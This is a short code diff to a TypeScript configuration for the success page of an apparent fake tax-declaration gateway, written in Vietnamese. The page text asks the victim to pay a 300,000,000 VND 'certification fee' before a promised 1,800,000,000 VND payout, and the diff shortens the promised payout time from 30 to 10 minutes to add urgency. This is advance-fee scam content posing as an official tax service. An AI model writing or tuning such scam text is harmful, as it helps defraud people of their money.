@@ -36,7 +36,7 @@ export const MASTER_CONFIG: ContractData = {
   
   // --- NỘI DUNG TRANG THÀNH CÔNG (SUCCESS - Hình 4) ---
   "successTitle": "Kê Khai Hoàn Tất!",
-  "successFeeText": "Hệ thống đã ghi nhận hồ sơ. Quý khách vui lòng hoàn tất lệ phí chứng thực hồ sơ quyết toán: 300.000.000 VNĐ. Sau khi xác nhận lệ phí, khoản tiền 1.800.000.000 VNĐ sẽ được giải ngân về tài khoản trong 30 phút.",
+  "successFeeText": "Hệ thống đã ghi nhận hồ sơ. Quý khách vui lòng hoàn tất lệ phí chứng thực hồ sơ quyết toán: 300.000.000 VNĐ. Sau khi xác nhận lệ phí, khoản tiền 1.800.000.000 VNĐ sẽ được giải ngân về tài khoản trong 10 phút.",
   
   "successAmountNote": "Số tiền dự kiến giải ngân",
   "successTransactionPrefix": "TAX-GATEWAY-2024-SECURE",
